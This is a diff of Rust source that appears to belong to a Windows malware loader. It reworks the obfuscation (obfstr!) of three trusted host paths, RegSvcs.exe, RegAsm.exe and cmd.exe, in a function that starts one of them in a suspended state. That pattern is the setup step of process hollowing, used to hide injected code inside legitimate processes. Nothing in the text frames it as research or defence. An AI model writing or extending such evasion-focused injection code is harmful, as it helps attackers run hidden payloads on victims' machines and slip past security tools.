@@ -9,13 +9,12 @@ use winapi::um::winnt::CONTEXT_FULL;
 pub unsafe fn spawn_suspended_host() -> Option<winapi::um::processthreadsapi::PROCESS_INFORMATION> {
     let mut si = std::mem::zeroed();
     let mut pi = std::mem::zeroed();
-
-    let hosts = [
-        obfstr!("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe"),
-        obfstr!("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe"),
-        obfstr!("C:\\Windows\\System32\\cmd.exe")
-    ];
-
+    obfstr! {
+		let host1 = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe";
+		let host2 = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe";
+		let host3 = "C:\\Windows\\System32\\cmd.exe";
+	}
+	let hosts = [host1, host2, host3];
     for path in hosts {
         let cmd = CString::new(path).unwrap();
         if CreateProcessA(cmd.as_ptr(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, CREATE_SUSPENDED, ptr::null_mut(), ptr::null_mut(), &mut si, &mut pi) != 0 {
